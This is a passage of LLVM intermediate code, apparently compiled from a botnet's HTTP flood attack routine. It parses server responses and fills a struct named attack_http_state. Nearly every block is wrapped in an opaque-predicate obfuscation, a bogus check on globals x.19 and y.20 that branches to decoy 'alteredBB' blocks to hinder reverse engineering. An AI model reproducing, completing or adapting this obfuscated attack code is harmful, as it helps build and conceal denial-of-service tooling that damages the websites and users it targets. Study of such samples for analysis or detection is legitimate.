  %2836 = load i32, i32* @x.19
  %2837 = load i32, i32* @y.20
  %2838 = sub i32 %2836, 1
  %2839 = mul i32 %2836, %2838
  %2840 = urem i32 %2839, 2
  %2841 = icmp eq i32 %2840, 0
  %2842 = icmp slt i32 %2837, 10
  %2843 = or i1 %2841, %2842
  br i1 %2843, label %originalBBpart2505, label %originalBB497alteredBB

originalBBpart2505:                               ; preds = %originalBB497
  br i1 %2835, label %2844, label %2863

; <label>:2844:                                   ; preds = %originalBBpart2505
  %2845 = load i8*, i8** %62, align 8
  %2846 = load i32, i32* %18, align 4
  %2847 = add nsw i32 %2846, 1
  %2848 = sext i32 %2847 to i64
  %2849 = getelementptr inbounds i8, i8* %2845, i64 %2848
  %2850 = call i32 @util_strlen(i8* %2849)
  %2851 = icmp slt i32 %2850, 256
  br i1 %2851, label %2852, label %2863

; <label>:2852:                                   ; preds = %2844
  %2853 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2854 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2853, i32 0, i32 6
  %2855 = getelementptr inbounds [257 x i8], [257 x i8]* %2854, i32 0, i32 0
  %2856 = getelementptr inbounds i8, i8* %2855, i64 1
  %2857 = load i8*, i8** %62, align 8
  %2858 = load i32, i32* %18, align 4
  %2859 = add nsw i32 %2858, 1
  %2860 = sext i32 %2859 to i64
  %2861 = getelementptr inbounds i8, i8* %2857, i64 %2860
  %2862 = call i32 @util_strcpy(i8* %2856, i8* %2861)
  br label %2863

; <label>:2863:                                   ; preds = %2852, %2844, %originalBBpart2505
  br label %2864

; <label>:2864:                                   ; preds = %2863, %2810
  br label %2865

; <label>:2865:                                   ; preds = %2864, %2809
  %2866 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %2867 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2866, i32 0, i32 1
  store i8 1, i8* %2867, align 4
  br label %4291

; <label>:2868:                                   ; preds = %2576
  br label %2869

; <label>:2869:                                   ; preds = %2868, %2556
  %2870 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2871 = load i32, i32* %20, align 4
  %2872 = call i8* @table_retrieve_val(i32 37, i32* null)
  %2873 = call i32 @util_stristr(i8* %2870, i32 %2871, i8* %2872)
  %2874 = icmp ne i32 %2873, -1
  br i1 %2874, label %2875, label %3445

; <label>:2875:                                   ; preds = %2869
  %2876 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2877 = load i32, i32* %20, align 4
  %2878 = call i8* @table_retrieve_val(i32 37, i32* null)
  %2879 = call i32 @util_stristr(i8* %2876, i32 %2877, i8* %2878)
  store i32 %2879, i32* %63, align 4
  %2880 = load i32, i32* %63, align 4
  %2881 = sext i32 %2880 to i64
  %2882 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2881
  %2883 = load i8, i8* %2882, align 1
  %2884 = sext i8 %2883 to i32
  %2885 = icmp eq i32 %2884, 32
  br i1 %2885, label %2886, label %2905

; <label>:2886:                                   ; preds = %2875
  %2887 = load i32, i32* @x.19
  %2888 = load i32, i32* @y.20
  %2889 = sub i32 %2887, 1
  %2890 = mul i32 %2887, %2889
  %2891 = urem i32 %2890, 2
  %2892 = icmp eq i32 %2891, 0
  %2893 = icmp slt i32 %2888, 10
  %2894 = or i1 %2892, %2893
  br i1 %2894, label %originalBB507, label %originalBB507alteredBB

originalBB507:                                    ; preds = %originalBB507alteredBB, %2886
  %2895 = load i32, i32* %63, align 4
  %2896 = add nsw i32 %2895, 1
  store i32 %2896, i32* %63, align 4
  %2897 = load i32, i32* @x.19
  %2898 = load i32, i32* @y.20
  %2899 = sub i32 %2897, 1
  %2900 = mul i32 %2897, %2899
  %2901 = urem i32 %2900, 2
  %2902 = icmp eq i32 %2901, 0
  %2903 = icmp slt i32 %2898, 10
  %2904 = or i1 %2902, %2903
  br i1 %2904, label %originalBBpart2517, label %originalBB507alteredBB

originalBBpart2517:                               ; preds = %originalBB507
  br label %2905

; <label>:2905:                                   ; preds = %originalBBpart2517, %2875
  %2906 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i32 0, i32 0
  %2907 = load i32, i32* %63, align 4
  %2908 = sext i32 %2907 to i64
  %2909 = getelementptr inbounds i8, i8* %2906, i64 %2908
  %2910 = load i32, i32* %20, align 4
  %2911 = load i32, i32* %63, align 4
  %2912 = sub nsw i32 %2910, %2911
  %2913 = call i32 @util_memsearch(i8* %2909, i32 %2912, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2913, i32* %64, align 4
  %2914 = load i32, i32* %64, align 4
  %2915 = icmp ne i32 %2914, -1
  br i1 %2915, label %2916, label %3444

; <label>:2916:                                   ; preds = %2905
  %2917 = load i32, i32* %63, align 4
  %2918 = sext i32 %2917 to i64
  %2919 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2918
  store i8* %2919, i8** %65, align 8
  %2920 = load i32, i32* %64, align 4
  %2921 = icmp sge i32 %2920, 2
  br i1 %2921, label %2922, label %2925

; <label>:2922:                                   ; preds = %2916
  %2923 = load i32, i32* %64, align 4
  %2924 = sub nsw i32 %2923, 2
  store i32 %2924, i32* %64, align 4
  br label %2925

; <label>:2925:                                   ; preds = %2922, %2916
  %2926 = load i32, i32* %63, align 4
  %2927 = load i32, i32* %64, align 4
  %2928 = add nsw i32 %2926, %2927
  %2929 = sext i32 %2928 to i64
  %2930 = getelementptr inbounds [10241 x i8], [10241 x i8]* %28, i64 0, i64 %2929
  store i8 0, i8* %2930, align 1
  %2931 = load i32, i32* %64, align 4
  %2932 = add nsw i32 %2931, 1
  store i32 %2932, i32* %64, align 4
  store i32 0, i32* %18, align 4
  br label %2933

; <label>:2933:                                   ; preds = %2991, %2925
  %2934 = load i8*, i8** %65, align 8
  %2935 = load i32, i32* %18, align 4
  %2936 = sext i32 %2935 to i64
  %2937 = getelementptr inbounds i8, i8* %2934, i64 %2936
  %2938 = load i8, i8* %2937, align 1
  %2939 = sext i8 %2938 to i32
  %2940 = icmp ne i32 %2939, 0
  br i1 %2940, label %2941, label %2973

; <label>:2941:                                   ; preds = %2933
  %2942 = load i8*, i8** %65, align 8
  %2943 = load i32, i32* %18, align 4
  %2944 = sext i32 %2943 to i64
  %2945 = getelementptr inbounds i8, i8* %2942, i64 %2944
  %2946 = load i8, i8* %2945, align 1
  %2947 = sext i8 %2946 to i32
  %2948 = icmp sge i32 %2947, 48
  br i1 %2948, label %2949, label %2973

; <label>:2949:                                   ; preds = %2941
  %2950 = load i32, i32* @x.19
  %2951 = load i32, i32* @y.20
  %2952 = sub i32 %2950, 1
  %2953 = mul i32 %2950, %2952
  %2954 = urem i32 %2953, 2
  %2955 = icmp eq i32 %2954, 0
  %2956 = icmp slt i32 %2951, 10
  %2957 = or i1 %2955, %2956
  br i1 %2957, label %originalBB519, label %originalBB519alteredBB

originalBB519:                                    ; preds = %originalBB519alteredBB, %2949
  %2958 = load i8*, i8** %65, align 8
  %2959 = load i32, i32* %18, align 4
  %2960 = sext i32 %2959 to i64
  %2961 = getelementptr inbounds i8, i8* %2958, i64 %2960
  %2962 = load i8, i8* %2961, align 1
  %2963 = sext i8 %2962 to i32
  %2964 = icmp sle i32 %2963, 57
  %2965 = load i32, i32* @x.19
  %2966 = load i32, i32* @y.20
  %2967 = sub i32 %2965, 1
  %2968 = mul i32 %2965, %2967
  %2969 = urem i32 %2968, 2
  %2970 = icmp eq i32 %2969, 0
  %2971 = icmp slt i32 %2966, 10
  %2972 = or i1 %2970, %2971
  br i1 %2972, label %originalBBpart2521, label %originalBB519alteredBB

originalBBpart2521:                               ; preds = %originalBB519
  br label %2973

; <label>:2973:                                   ; preds = %originalBBpart2521, %2941, %2933
  %2974 = phi i1 [ false, %2941 ], [ false, %2933 ], [ %2964, %originalBBpart2521 ]
  %2975 = load i32, i32* @x.19
  %2976 = load i32, i32* @y.20
  %2977 = sub i32 %2975, 1
  %2978 = mul i32 %2975, %2977
  %2979 = urem i32 %2978, 2
  %2980 = icmp eq i32 %2979, 0
  %2981 = icmp slt i32 %2976, 10
  %2982 = or i1 %2980, %2981
  br i1 %2982, label %originalBB523, label %originalBB523alteredBB

originalBB523:                                    ; preds = %originalBB523alteredBB, %2973
  %2983 = load i32, i32* @x.19
  %2984 = load i32, i32* @y.20
  %2985 = sub i32 %2983, 1
  %2986 = mul i32 %2983, %2985
  %2987 = urem i32 %2986, 2
  %2988 = icmp eq i32 %2987, 0
  %2989 = icmp slt i32 %2984, 10
  %2990 = or i1 %2988, %2989
  br i1 %2990, label %originalBBpart2525, label %originalBB523alteredBB

originalBBpart2525:                               ; preds = %originalBB523
  br i1 %2974, label %2991, label %2994

; <label>:2991:                                   ; preds = %originalBBpart2525
  %2992 = load i32, i32* %18, align 4
  %2993 = add nsw i32 %2992, 1
  store i32 %2993, i32* %18, align 4
  br label %2933

; <label>:2994:                                   ; preds = %originalBBpart2525
  %2995 = load i8*, i8** %65, align 8
  %2996 = load i32, i32* %18, align 4
  %2997 = sext i32 %2996 to i64
  %2998 = getelementptr inbounds i8, i8* %2995, i64 %2997
  %2999 = load i8, i8* %2998, align 1
  %3000 = sext i8 %2999 to i32
  %3001 = icmp ne i32 %3000, 0
  br i1 %3001, label %3002, label %3443

; <label>:3002:                                   ; preds = %2994
  %3003 = load i32, i32* @x.19
  %3004 = load i32, i32* @y.20
  %3005 = sub i32 %3003, 1
  %3006 = mul i32 %3003, %3005
  %3007 = urem i32 %3006, 2
  %3008 = icmp eq i32 %3007, 0
  %3009 = icmp slt i32 %3004, 10
  %3010 = or i1 %3008, %3009
  br i1 %3010, label %originalBB527, label %originalBB527alteredBB

originalBB527:                                    ; preds = %originalBB527alteredBB, %3002
  store i32 0, i32* %66, align 4
  %3011 = load i8*, i8** %65, align 8
  %3012 = load i32, i32* %18, align 4
  %3013 = sext i32 %3012 to i64
  %3014 = getelementptr inbounds i8, i8* %3011, i64 %3013
  store i8 0, i8* %3014, align 1
  %3015 = load i32, i32* %18, align 4
  %3016 = add nsw i32 %3015, 1
  store i32 %3016, i32* %18, align 4
  %3017 = load i8*, i8** %65, align 8
  %3018 = load i32, i32* %18, align 4
  %3019 = sext i32 %3018 to i64
  %3020 = getelementptr inbounds i8, i8* %3017, i64 %3019
  %3021 = load i8, i8* %3020, align 1
  %3022 = sext i8 %3021 to i32
  %3023 = icmp eq i32 %3022, 32
  %3024 = load i32, i32* @x.19
  %3025 = load i32, i32* @y.20
  %3026 = sub i32 %3024, 1
  %3027 = mul i32 %3024, %3026
  %3028 = urem i32 %3027, 2
  %3029 = icmp eq i32 %3028, 0
  %3030 = icmp slt i32 %3025, 10
  %3031 = or i1 %3029, %3030
  br i1 %3031, label %originalBBpart2541, label %originalBB527alteredBB

originalBBpart2541:                               ; preds = %originalBB527
  br i1 %3023, label %3032, label %3035

; <label>:3032:                                   ; preds = %originalBBpart2541
  %3033 = load i32, i32* %18, align 4
  %3034 = add nsw i32 %3033, 1
  store i32 %3034, i32* %18, align 4
  br label %3035

; <label>:3035:                                   ; preds = %3032, %originalBBpart2541
  %3036 = load i8*, i8** %65, align 8
  %3037 = load i32, i32* %18, align 4
  %3038 = sext i32 %3037 to i64
  %3039 = getelementptr inbounds i8, i8* %3036, i64 %3038
  %3040 = load i8*, i8** %65, align 8
  %3041 = load i32, i32* %18, align 4
  %3042 = sext i32 %3041 to i64
  %3043 = getelementptr inbounds i8, i8* %3040, i64 %3042
  %3044 = call i32 @util_strlen(i8* %3043)
  %3045 = call i32 @util_stristr(i8* %3039, i32 %3044, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %3046 = icmp ne i32 %3045, -1
  br i1 %3046, label %3047, label %3076

; <label>:3047:                                   ; preds = %3035
  %3048 = load i32, i32* @x.19
  %3049 = load i32, i32* @y.20
  %3050 = sub i32 %3048, 1
  %3051 = mul i32 %3048, %3050
  %3052 = urem i32 %3051, 2
  %3053 = icmp eq i32 %3052, 0
  %3054 = icmp slt i32 %3049, 10
  %3055 = or i1 %3053, %3054
  br i1 %3055, label %originalBB543, label %originalBB543alteredBB

originalBB543:                                    ; preds = %originalBB543alteredBB, %3047
  %3056 = load i8*, i8** %65, align 8
  %3057 = load i32, i32* %18, align 4
  %3058 = sext i32 %3057 to i64
  %3059 = getelementptr inbounds i8, i8* %3056, i64 %3058
  %3060 = load i8*, i8** %65, align 8
  %3061 = load i32, i32* %18, align 4
  %3062 = sext i32 %3061 to i64
  %3063 = getelementptr inbounds i8, i8* %3060, i64 %3062
  %3064 = call i32 @util_strlen(i8* %3063)
  %3065 = call i32 @util_stristr(i8* %3059, i32 %3064, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %3066 = load i32, i32* %18, align 4
  %3067 = add nsw i32 %3066, %3065
  store i32 %3067, i32* %18, align 4
  %3068 = load i32, i32* @x.19
  %3069 = load i32, i32* @y.20
  %3070 = sub i32 %3068, 1
  %3071 = mul i32 %3068, %3070
  %3072 = urem i32 %3071, 2
  %3073 = icmp eq i32 %3072, 0
  %3074 = icmp slt i32 %3069, 10
  %3075 = or i1 %3073, %3074
  br i1 %3075, label %originalBBpart2557, label %originalBB543alteredBB

originalBBpart2557:                               ; preds = %originalBB543
  br label %3076

; <label>:3076:                                   ; preds = %originalBBpart2557, %3035
  %3077 = load i8*, i8** %65, align 8
  %3078 = load i32, i32* %18, align 4
  %3079 = sext i32 %3078 to i64
  %3080 = getelementptr inbounds i8, i8* %3077, i64 %3079
  %3081 = load i8, i8* %3080, align 1
  %3082 = sext i8 %3081 to i32
  %3083 = icmp eq i32 %3082, 34
  br i1 %3083, label %3084, label %3132

; <label>:3084:                                   ; preds = %3076
  %3085 = load i32, i32* @x.19
  %3086 = load i32, i32* @y.20
  %3087 = sub i32 %3085, 1
  %3088 = mul i32 %3085, %3087
  %3089 = urem i32 %3088, 2
  %3090 = icmp eq i32 %3089, 0
  %3091 = icmp slt i32 %3086, 10
  %3092 = or i1 %3090, %3091
  br i1 %3092, label %originalBB559, label %originalBB559alteredBB

originalBB559:                                    ; preds = %originalBB559alteredBB, %3084
  %3093 = load i32, i32* %18, align 4
  %3094 = add nsw i32 %3093, 1
  store i32 %3094, i32* %18, align 4
  %3095 = load i8*, i8** %65, align 8
  %3096 = load i32, i32* %18, align 4
  %3097 = sext i32 %3096 to i64
  %3098 = getelementptr inbounds i8, i8* %3095, i64 %3097
  %3099 = load i8*, i8** %65, align 8
  %3100 = load i32, i32* %18, align 4
  %3101 = sext i32 %3100 to i64
  %3102 = getelementptr inbounds i8, i8* %3099, i64 %3101
  %3103 = call i32 @util_strlen(i8* %3102)
  %3104 = sub nsw i32 %3103, 1
  %3105 = sext i32 %3104 to i64
  %3106 = getelementptr inbounds i8, i8* %3098, i64 %3105
  %3107 = load i8, i8* %3106, align 1
  %3108 = sext i8 %3107 to i32
  %3109 = icmp eq i32 %3108, 34
  %3110 = load i32, i32* @x.19
  %3111 = load i32, i32* @y.20
  %3112 = sub i32 %3110, 1
  %3113 = mul i32 %3110, %3112
  %3114 = urem i32 %3113, 2
  %3115 = icmp eq i32 %3114, 0
  %3116 = icmp slt i32 %3111, 10
  %3117 = or i1 %3115, %3116
  br i1 %3117, label %originalBBpart2584, label %originalBB559alteredBB

originalBBpart2584:                               ; preds = %originalBB559
  br i1 %3109, label %3118, label %3131

; <label>:3118:                                   ; preds = %originalBBpart2584
  %3119 = load i8*, i8** %65, align 8
  %3120 = load i32, i32* %18, align 4
  %3121 = sext i32 %3120 to i64
  %3122 = getelementptr inbounds i8, i8* %3119, i64 %3121
  %3123 = load i8*, i8** %65, align 8
  %3124 = load i32, i32* %18, align 4
  %3125 = sext i32 %3124 to i64
  %3126 = getelementptr inbounds i8, i8* %3123, i64 %3125
  %3127 = call i32 @util_strlen(i8* %3126)
  %3128 = sub nsw i32 %3127, 1
  %3129 = sext i32 %3128 to i64
  %3130 = getelementptr inbounds i8, i8* %3122, i64 %3129
  store i8 0, i8* %3130, align 1
  br label %3131

; <label>:3131:                                   ; preds = %3118, %originalBBpart2584
  br label %3132

; <label>:3132:                                   ; preds = %3131, %3076
  %3133 = load i8*, i8** %65, align 8
  %3134 = call i32 @util_atoi(i8* %3133, i32 10)
  store i32 %3134, i32* %66, align 4
  br label %3135

; <label>:3135:                                   ; preds = %3166, %3132
  %3136 = load i32, i32* %66, align 4
  %3137 = icmp sgt i32 %3136, 0
  br i1 %3137, label %3138, label %3164

; <label>:3138:                                   ; preds = %3135
  %3139 = load i32, i32* %66, align 4
  %3140 = icmp slt i32 %3139, 10
  br i1 %3140, label %3141, label %3164

; <label>:3141:                                   ; preds = %3138
  %3142 = load i32, i32* @x.19
  %3143 = load i32, i32* @y.20
  %3144 = sub i32 %3142, 1
  %3145 = mul i32 %3142, %3144
  %3146 = urem i32 %3145, 2
  %3147 = icmp eq i32 %3146, 0
  %3148 = icmp slt i32 %3143, 10
  %3149 = or i1 %3147, %3148
  br i1 %3149, label %originalBB586, label %originalBB586alteredBB

originalBB586:                                    ; preds = %originalBB586alteredBB, %3141
  %3150 = load i32, i32* %35, align 4
  %3151 = load i32, i32* %66, align 4
  %3152 = add i32 %3150, %3151
  %3153 = zext i32 %3152 to i64
  %3154 = call i64 @time(i64* null) #6
  %3155 = icmp sgt i64 %3153, %3154
  %3156 = load i32, i32* @x.19
  %3157 = load i32, i32* @y.20
  %3158 = sub i32 %3156, 1
  %3159 = mul i32 %3156, %3158
  %3160 = urem i32 %3159, 2
  %3161 = icmp eq i32 %3160, 0
  %3162 = icmp slt i32 %3157, 10
  %3163 = or i1 %3161, %3162
  br i1 %3163, label %originalBBpart2589, label %originalBB586alteredBB

originalBBpart2589:                               ; preds = %originalBB586
  br label %3164

; <label>:3164:                                   ; preds = %originalBBpart2589, %3138, %3135
  %3165 = phi i1 [ false, %3138 ], [ false, %3135 ], [ %3155, %originalBBpart2589 ]
  br i1 %3165, label %3166, label %3168

; <label>:3166:                                   ; preds = %3164
  %3167 = call i32 @sleep(i32 1)
  br label %3135

; <label>:3168:                                   ; preds = %3164
  %3169 = load i8*, i8** %65, align 8
  %3170 = load i32, i32* %18, align 4
  %3171 = sext i32 %3170 to i64
  %3172 = getelementptr inbounds i8, i8* %3169, i64 %3171
  store i8* %3172, i8** %65, align 8
  %3173 = load i8*, i8** %65, align 8
  %3174 = load i8*, i8** %65, align 8
  %3175 = call i32 @util_strlen(i8* %3174)
  %3176 = call i32 @util_stristr(i8* %3173, i32 %3175, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %3177 = icmp eq i32 %3176, 4
  br i1 %3177, label %3178, label %3348

; <label>:3178:                                   ; preds = %3168
  store i32 7, i32* %18, align 4
  %3179 = load i8*, i8** %65, align 8
  %3180 = getelementptr inbounds i8, i8* %3179, i64 4
  %3181 = load i8, i8* %3180, align 1
  %3182 = sext i8 %3181 to i32
  %3183 = icmp eq i32 %3182, 115
  br i1 %3183, label %3184, label %3187

; <label>:3184:                                   ; preds = %3178
  %3185 = load i32, i32* %18, align 4
  %3186 = add nsw i32 %3185, 1
  store i32 %3186, i32* %18, align 4
  br label %3187

; <label>:3187:                                   ; preds = %3184, %3178
  %3188 = load i8*, i8** %65, align 8
  %3189 = load i8*, i8** %65, align 8
  %3190 = load i32, i32* %18, align 4
  %3191 = sext i32 %3190 to i64
  %3192 = getelementptr inbounds i8, i8* %3189, i64 %3191
  %3193 = load i32, i32* %64, align 4
  %3194 = load i32, i32* %18, align 4
  %3195 = sub nsw i32 %3193, %3194
  %3196 = sext i32 %3195 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3188, i8* %3192, i64 %3196, i32 1, i1 false)
  store i32 0, i32* %18, align 4
  br label %3197

; <label>:3197:                                   ; preds = %3218, %3187
  %3198 = load i8*, i8** %65, align 8
  %3199 = load i32, i32* %18, align 4
  %3200 = sext i32 %3199 to i64
  %3201 = getelementptr inbounds i8, i8* %3198, i64 %3200
  %3202 = load i8, i8* %3201, align 1
  %3203 = sext i8 %3202 to i32
  %3204 = icmp ne i32 %3203, 0
  br i1 %3204, label %3205, label %3221

; <label>:3205:                                   ; preds = %3197
  %3206 = load i8*, i8** %65, align 8
  %3207 = load i32, i32* %18, align 4
  %3208 = sext i32 %3207 to i64
  %3209 = getelementptr inbounds i8, i8* %3206, i64 %3208
  %3210 = load i8, i8* %3209, align 1
  %3211 = sext i8 %3210 to i32
  %3212 = icmp eq i32 %3211, 47
  br i1 %3212, label %3213, label %3218

; <label>:3213:                                   ; preds = %3205
  %3214 = load i8*, i8** %65, align 8
  %3215 = load i32, i32* %18, align 4
  %3216 = sext i32 %3215 to i64
  %3217 = getelementptr inbounds i8, i8* %3214, i64 %3216
  store i8 0, i8* %3217, align 1
  br label %3221

; <label>:3218:                                   ; preds = %3205
  %3219 = load i32, i32* %18, align 4
  %3220 = add nsw i32 %3219, 1
  store i32 %3220, i32* %18, align 4
  br label %3197

; <label>:3221:                                   ; preds = %3213, %3197
  %3222 = load i32, i32* @x.19
  %3223 = load i32, i32* @y.20
  %3224 = sub i32 %3222, 1
  %3225 = mul i32 %3222, %3224
  %3226 = urem i32 %3225, 2
  %3227 = icmp eq i32 %3226, 0
  %3228 = icmp slt i32 %3223, 10
  %3229 = or i1 %3227, %3228
  br i1 %3229, label %originalBB591, label %originalBB591alteredBB

originalBB591:                                    ; preds = %originalBB591alteredBB, %3221
  %3230 = load i8*, i8** %65, align 8
  %3231 = call i32 @util_strlen(i8* %3230)
  %3232 = icmp sgt i32 %3231, 0
  %3233 = load i32, i32* @x.19
  %3234 = load i32, i32* @y.20
  %3235 = sub i32 %3233, 1
  %3236 = mul i32 %3233, %3235
  %3237 = urem i32 %3236, 2
  %3238 = icmp eq i32 %3237, 0
  %3239 = icmp slt i32 %3234, 10
  %3240 = or i1 %3238, %3239
  br i1 %3240, label %originalBBpart2593, label %originalBB591alteredBB

originalBBpart2593:                               ; preds = %originalBB591
  br i1 %3232, label %3241, label %3283

; <label>:3241:                                   ; preds = %originalBBpart2593
  %3242 = load i32, i32* @x.19
  %3243 = load i32, i32* @y.20
  %3244 = sub i32 %3242, 1
  %3245 = mul i32 %3242, %3244
  %3246 = urem i32 %3245, 2
  %3247 = icmp eq i32 %3246, 0
  %3248 = icmp slt i32 %3243, 10
  %3249 = or i1 %3247, %3248
  br i1 %3249, label %originalBB595, label %originalBB595alteredBB

originalBB595:                                    ; preds = %originalBB595alteredBB, %3241
  %3250 = load i8*, i8** %65, align 8
  %3251 = call i32 @util_strlen(i8* %3250)
  %3252 = icmp slt i32 %3251, 128
  %3253 = load i32, i32* @x.19
  %3254 = load i32, i32* @y.20
  %3255 = sub i32 %3253, 1
  %3256 = mul i32 %3253, %3255
  %3257 = urem i32 %3256, 2
  %3258 = icmp eq i32 %3257, 0
  %3259 = icmp slt i32 %3254, 10
  %3260 = or i1 %3258, %3259
  br i1 %3260, label %originalBBpart2597, label %originalBB595alteredBB

originalBBpart2597:                               ; preds = %originalBB595
  br i1 %3252, label %3261, label %3283

; <label>:3261:                                   ; preds = %originalBBpart2597
  %3262 = load i32, i32* @x.19
  %3263 = load i32, i32* @y.20
  %3264 = sub i32 %3262, 1
  %3265 = mul i32 %3262, %3264
  %3266 = urem i32 %3265, 2
  %3267 = icmp eq i32 %3266, 0
  %3268 = icmp slt i32 %3263, 10
  %3269 = or i1 %3267, %3268
  br i1 %3269, label %originalBB599, label %originalBB599alteredBB

originalBB599:                                    ; preds = %originalBB599alteredBB, %3261
  %3270 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3270, i32 0, i32 7
  %3272 = getelementptr inbounds [129 x i8], [129 x i8]* %3271, i32 0, i32 0
  %3273 = load i8*, i8** %65, align 8
  %3274 = call i32 @util_strcpy(i8* %3272, i8* %3273)
  %3275 = load i32, i32* @x.19
  %3276 = load i32, i32* @y.20
  %3277 = sub i32 %3275, 1
  %3278 = mul i32 %3275, %3277
  %3279 = urem i32 %3278, 2
  %3280 = icmp eq i32 %3279, 0
  %3281 = icmp slt i32 %3276, 10
  %3282 = or i1 %3280, %3281
  br i1 %3282, label %originalBBpart2601, label %originalBB599alteredBB

originalBBpart2601:                               ; preds = %originalBB599
  br label %3283

; <label>:3283:                                   ; preds = %originalBBpart2601, %originalBBpart2597, %originalBBpart2593
  %3284 = load i8*, i8** %65, align 8
  %3285 = load i32, i32* %18, align 4
  %3286 = add nsw i32 %3285, 1
  %3287 = sext i32 %3286 to i64
  %3288 = getelementptr inbounds i8, i8* %3284, i64 %3287
  %3289 = call i32 @util_strlen(i8* %3288)
  %3290 = icmp slt i32 %3289, 256
  br i1 %3290, label %3291, label %3331

; <label>:3291:                                   ; preds = %3283
  %3292 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3293 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3292, i32 0, i32 6
  %3294 = getelementptr inbounds [257 x i8], [257 x i8]* %3293, i32 0, i32 0
  %3295 = getelementptr inbounds i8, i8* %3294, i64 1
  call void @util_zero(i8* %3295, i32 255)
  %3296 = load i8*, i8** %65, align 8
  %3297 = load i32, i32* %18, align 4
  %3298 = add nsw i32 %3297, 1
  %3299 = sext i32 %3298 to i64
  %3300 = getelementptr inbounds i8, i8* %3296, i64 %3299
  %3301 = call i32 @util_strlen(i8* %3300)
  %3302 = icmp sgt i32 %3301, 0
  br i1 %3302, label %3303, label %3314

; <label>:3303:                                   ; preds = %3291
  %3304 = load %struct.attack_http_state*, %struct.attack_http_state** %34, align 8
  %3305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3304, i32 0, i32 6
  %3306 = getelementptr inbounds [257 x i8], [257 x i8]* %3305, i32 0, i32 0
  %3307 = getelementptr inbounds i8, i8* %3306, i64 1
  %3308 = load i8*, i8** %65, align 8
  %3309 = load i32, i32* %18, align 4
  %3310 = add nsw i32 %3309, 1
  %3311 = sext i32 %3310 to i64
  %3312 = getelementptr inbounds i8, i8* %3308, i64 %3311
  %3313 = call i32 @util_strcpy(i8* %3307, i8* %3312)
  br label %3314

; <label>:3314:                                   ; preds = %3303, %3291
  %3315 = load i32, i32* @x.19
  %3316 = load i32, i32* @y.20
  %3317 = sub i32 %3315, 1
  %3318 = mul i32 %3315, %3317
  %3319 = urem i32 %3318, 2
  %3320 = icmp eq i32 %3319, 0
  %3321 = icmp slt i32 %3316, 10
  %3322 = or i1 %3320, %3321
  br i1 %3322, label %originalBB603, label %originalBB603alteredBB

originalBB603:                                    ; preds = %originalBB603alteredBB, %3314
  %3323 = load i32, i32* @x.19
  %3324 = load i32, i32* @y.20
  %3325 = sub i32 %3323, 1
  %3326 = mul i32 %3323, %3325
  %3327 = urem i32 %3326, 2
  %3328 = icmp eq i32 %3327, 0
  %3329 = icmp slt i32 %3324, 10
  %3330 = or i1 %3328, %3329
  br i1 %3330, label %originalBBpart2605, label %originalBB603alteredBB

originalBBpart2605:                               ; preds = %originalBB603
  br label %3331

; <label>:3331:                                   ; preds = %originalBBpart2605, %3283
  %3332 = load i32, i32* @x.19
  %3333 = load i32, i32* @y.20
  %3334 = sub i32 %3332, 1
  %3335 = mul i32 %3332, %3334
  %3336 = urem i32 %3335, 2
  %3337 = icmp eq i32 %3336, 0
  %3338 = icmp slt i32 %3333, 10
  %3339 = or i1 %3337, %3338
  br i1 %3339, label %originalBB607, label %originalBB607alteredBB

originalBB607:                                    ; preds = %originalBB607alteredBB, %3331
  %3340 = load i32, i32* @x.19
  %3341 = load i32, i32* @y.20
  %3342 = sub i32 %3340, 1
  %3343 = mul i32 %3340, %3342
  %3344 = urem i32 %3343, 2
  %3345 = icmp eq i32 %3344, 0
  %3346 = icmp slt i32 %3341, 10
  %3347 = or i1 %3345, %3346
  br i1 %3347, label %originalBBpart2609, label %originalBB607alteredBB

originalBBpart2609:                               ; preds = %originalBB607
  br label %3436

; <label>:3348:                                   ; preds = %3168
  %3349 = load i8*, i8** %65, align 8
  %3350 = getelementptr inbounds i8, i8* %3349, i64 0
  %3351 = load i8, i8* %3350, align 1
  %3352 = sext i8 %3351 to i32
  %3353 = icmp eq i32 %3352, 47
  br i1 %3353, label %3354, label %3435

; <label>:3354:                                   ; preds = %3348
  %3355 = load i32, i32* @x.19
  %3356 = load i32, i32* @y.20
  %3357 = sub i32 %3355, 1
  %3358 = mul i32 %3355, %3357
  %3359 = urem i32 %3358, 2
  %3360 = icmp eq i32 %3359, 0
  %3361 = icmp slt i32 %3356, 10
  %3362 = or i1 %3360, %3361
  br i1 %3362, label %originalBB611, label %originalBB611alteredBB

originalBB611:                                    ; preds = %originalBB611alteredBB, %3354
  %3363 = load i8*, i8** %65, align 8
  %3364 = load i32, i32* %18, align 4
  %3365 = add nsw i32 %3364, 1
  %3366 = sext i32 %3365 to i64
  %3367 = getelementptr inbounds i8, i8* %3363, i64 %3366
  %3368 = call i32 @util_strlen(i8* %3367)
  %3369 = icmp slt i32 %3368, 256
  %3370 = load i32, i32* @x.19
  %3371 = load i32, i32* @y.20
  %3372 = sub i32 %3370, 1
  %3373 = mul i32 %3370, %3372
  %3374 = urem i32 %3373, 2
  %3375 = icmp eq i32 %3374, 0
  %3376 = icmp slt i32 %3371, 10
  %3377 = or i1 %3375, %3376
  br i1 %3377, label %originalBBpart2622, label %originalBB611alteredBB

originalBBpart2622:                               ; preds = %originalBB611
  br i1 %3369, label %3378, label %3418

; <label>:3378:                                   ; preds = %originalBBpart2622
